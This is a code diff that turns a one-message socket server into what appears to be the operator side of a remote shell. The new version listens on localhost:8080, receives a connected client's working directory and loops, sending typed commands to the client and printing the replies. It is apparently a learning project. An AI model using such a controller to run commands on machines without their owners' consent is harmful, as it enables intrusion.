@@ -1,4 +1,7 @@
 #include <netinet/in.h>
+#include <string>
+#include <iostream>
+#include <arpa/inet.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -6,16 +9,35 @@
 #include <unistd.h>
 
 #define PORT (8080)
+#define HOST ("127.0.0.1")
 #define BACKLOG (3)
+
+using namespace std;
 
 int setup_socket();
 
 int main() {
-  int socket_accept_return = setup_socket();
-  char buffer[1024] = { 0 };
-  int valread = read(socket_accept_return, buffer, 1024);
-  printf("%s\n", buffer);
-  close(socket_accept_return);
+  printf("[*] Listening on %s:%d...\n", HOST, PORT);
+  int server_fd = setup_socket();
+  printf("[*] Client connected\n");
+  string user_input = "";
+  char cwd[256];
+  int valread = read(server_fd, cwd, 256);
+  while (true) {
+    printf("%s> ", cwd);
+    getline(cin, user_input);
+    char buffer[user_input.length() + 1];
+    strcpy(buffer, user_input.c_str());
+    send(server_fd, buffer, strlen(buffer), 0);
+    char response[1024] = { 0 };
+    int valread = read(server_fd, response, 1024);
+    if (strcmp(response, "") == 0) {
+      continue;
+    }
+    printf("%s\n", response);
+  }
+
+  close(server_fd);
   return 0;
 
 }
@@ -34,7 +56,8 @@ int setup_socket() {
 
   struct sockaddr_in address;
   address.sin_family = AF_INET;
-  address.sin_addr.s_addr = INADDR_ANY;
+  
+  inet_pton(AF_INET, HOST, &address.sin_addr.s_addr);
   address.sin_port = htons(PORT);
   int addrlen = sizeof(address);
   
@@ -51,6 +74,7 @@ int setup_socket() {
     exit(EXIT_FAILURE);
   } 
   
+  /* change this socket name */
   int server_fd = accept(socket_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen);
 
   if (server_fd < 0) {
